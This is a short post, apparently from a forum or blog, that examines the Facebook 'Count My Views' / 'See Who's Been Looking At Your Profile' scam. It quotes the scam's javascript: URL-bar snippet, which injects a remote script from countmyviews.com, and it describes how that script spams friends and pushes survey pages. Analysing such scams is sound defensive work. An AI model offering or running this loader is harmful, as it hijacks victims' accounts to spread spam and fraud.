I'm just trying dissect the code behind the Facebook "Count My Views" and "See Who's Been Looking At Your Profile" scams. As far as I can tell, this scam has been around since at least early January 2011.

Currently the scam starts by asking the user to paste this in their URL Bar:
<code>javascript:(a=(b=document).createElement('script')).src='//countmyviews.com/js.js',b.body.appendChild(a);void(0)</code>

The javascript above injects some javascript into the Facebook page which runs this 'countmyviews' javascript. The 'countmyviews' javascriptv then chats all your friends and posts facebook statuses and creates a new event trying to get as many other people do the same thing. The end result is that after running the link (and accidentally spamming your friend) it takes you to a page asking you to fill out one of five or six surverys before finding out who has been visiting your profile page (all lies of course).

More information will be posted as I discover more.
